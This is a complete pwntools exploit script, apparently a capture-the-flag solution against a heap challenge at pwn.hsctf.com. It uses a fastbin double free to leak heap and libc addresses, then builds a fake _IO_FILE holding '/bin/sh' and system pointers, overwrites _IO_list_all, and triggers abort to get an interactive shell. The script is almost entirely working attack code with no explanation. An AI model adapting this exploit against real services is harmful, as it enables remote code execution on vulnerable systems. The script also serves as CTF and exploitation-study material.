from pwn import *

###Utils
def create(size,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('> ',str(size))
    r.sendafter('> ',data)

def show(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('> ',str(idx))
    return r.recvline()

def delete(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('> ',str(idx))

def abortp(size):
    r.sendlineafter('> ','1')
    r.sendlineafter('> ',str(size))

###Addr
main_arena_offset = 0x3c4b20
unsorted_bin_offset = main_arena_offset+0x58
IO_list_all_offset = 0x3c5520
system_offset = 0x45390

'''
main_arena_offset = 0x399b00
unsorted_bin_offset = main_arena_offset+0x58
IO_list_all_offset = 0x39a500
system_offset = 0x3f480
'''
###Exploit
r = remote('pwn.hsctf.com',5555)

create(0x48,'a')                            #0  00
create(0x48,p64(0)*6+p64(0)+p64(0x51))      #1  50
create(0x18,'a')                            #2  a0

create(0x18,'a')                            #3  c0
create(0x48,p64(0)+p64(0x21))               #4  e0
create(0x18,'a')                            #5  130
create(0x48,'a')                            #6  150
create(0x48,'a')                            #7  1a0

delete(0)
delete(1)
delete(0)
heap = u64(show(0)[:-1].ljust(8,b'\x00'))-0x50
create(0x48,p64(heap+0x90))                 #8
create(0x48,'a')                            #9
create(0x48,'a')                            #10
create(0x48,p64(0)+p64(0x51)+p64(0)*3+p64(0x91))  #11
delete(3)
unsorted_bin_addr = u64(show(3)[:-1].ljust(8,b'\x00'))
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

delete(2)
create(0x48,p64(0)*2+b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(libc_base+IO_list_all_offset-0x10)+p64(0)+p64(1))

delete(6)
create(0x48,p64(0)*7+p64(heap+0x1b0))

delete(7)
create(0x48,p64(libc_base+system_offset)*9)

print('abort')
input()
abortp(0x38)

r.interactive()

#create(0x48,p64(0)*6+p64(0)+p64(0x71))
